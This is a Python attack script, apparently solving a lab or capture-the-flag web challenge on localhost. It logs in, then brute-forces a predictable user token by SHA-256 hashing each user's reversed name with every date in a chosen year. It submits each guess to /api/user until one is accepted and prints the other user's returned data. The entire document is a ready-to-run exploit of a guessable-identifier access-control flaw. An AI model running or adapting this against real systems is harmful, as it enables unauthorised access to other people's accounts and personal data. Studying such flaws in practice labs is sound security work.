import requests
import hashlib
from datetime import datetime, timedelta
import argparse

# Login function
def login(email, password):
    login_url = "http://localhost:8081/api/login"
    
    # Prepare login data
    login_data = {
        "email": email,
        "password": password
    }

    # Define headers as provided in the example
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Origin": "http://localhost:8081",
        "Referer": "http://localhost:8081/login",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-User": "?1",
        "Cache-Control": "max-age=0",
        "sec-ch-ua": '"Chromium";v="135", "Not-A.Brand";v="8"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Linux"'
    }

    # Use a session to maintain cookies
    session = requests.Session()

    # Send POST request to login
    response = session.post(login_url, data=login_data, headers=headers)
    
    if response.status_code == 200:
        print("[+] Logged in successfully!")
        return session  # Return the session with cookies
    else:
        print("[!] Login failed. Status code:", response.status_code)
        return None

# Function to generate user hash from firstname, lastname, and date
def generate_user_hash(firstname, lastname, date_str):
    # Reverse the full name and append the date
    full_name = firstname + lastname
    reversed_str = (full_name[::-1] + date_str).encode("utf-8")
    digest = hashlib.sha256(reversed_str).digest()

    # Hex encode the SHA-256 hash
    hex_encoded = ""
    for i in range(0, len(digest), 4):
        chunk = digest[i:i+4]
        val = int.from_bytes(chunk, byteorder='big')
        hex_encoded += f"{val:08x}"
    return hex_encoded

# Function to send POST request to /api/user
def send_user_request(session, user_hash):
    # URL for the second POST request
    url = "http://localhost:8081/api/user"

    # Headers for the second request
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Origin": "http://localhost:8081",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "http://localhost:8081/profile",
        "Accept-Encoding": "gzip, deflate, br"
    }

    # Data for the second request (using the dynamically generated user_hash)
    data = {
        "user_hash": user_hash
    }

    # Send the POST request using the session
    response = session.post(url, headers=headers, json=data)

    # Always return the response object
    return response

# Brute-force hashes for every date in a given year
def brute_force(firstname, lastname, year, session, verbose=False):
    start_date = datetime(year, 1, 1)
    end_date = datetime(year, 12, 31)

    current_date = start_date
    while current_date <= end_date:
        date_str = current_date.strftime("%d%m%Y")
        user_hash = generate_user_hash(firstname, lastname, date_str)
        
        # If verbose mode, print each date and user hash
        if verbose:
            print(f"[!] Testing date {date_str} → {user_hash}")
        
        # Send the generated user_hash to /api/user and check the response
        response = send_user_request(session, user_hash)
        
        # Check if the response was successful (status 200)
        if response.status_code == 200:
            # Print response when verbose is enabled
            if verbose:
                print(f"[✓] Found valid hash for {firstname} {lastname} on {date_str}")
                print(f"Response: {response.json()}")
            else:
                # If not verbose, just print success and response
                print(f"[+] User request successful!")
                print(f"Response: {response.json()}")
            break  # Stop once a valid hash is found
        
        current_date += timedelta(days=1)

# Main function with argparse
def main():
    # Set up argparse to get arguments from the command line
    parser = argparse.ArgumentParser(description="Brute-force user hash generation.")
    parser.add_argument("-e", "--email", required=True, help="Email address for login.")
    parser.add_argument("-p", "--password", required=True, help="Password for login.")
    parser.add_argument("-n", "--name", required=True, help="Full name of the user in 'firstname lastname' format.")
    parser.add_argument("-y", "--year", type=int, required=True, help="Year to generate hashes for (e.g. 2025).")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output.")

    args = parser.parse_args()

    # Extract first and last name from the name argument
    first_name, last_name = args.name.split()

    # Step 1: Login to get the session
    session = login(args.email, args.password)

    # Step 2: If login is successful, brute-force the user hash for each date in the year
    if session:
        print(f"[*] Brute-forcing hashes for {first_name} {last_name} for the year {args.year}...")
        brute_force(first_name, last_name, args.year, session, args.verbose)


if __name__ == "__main__":
    main()
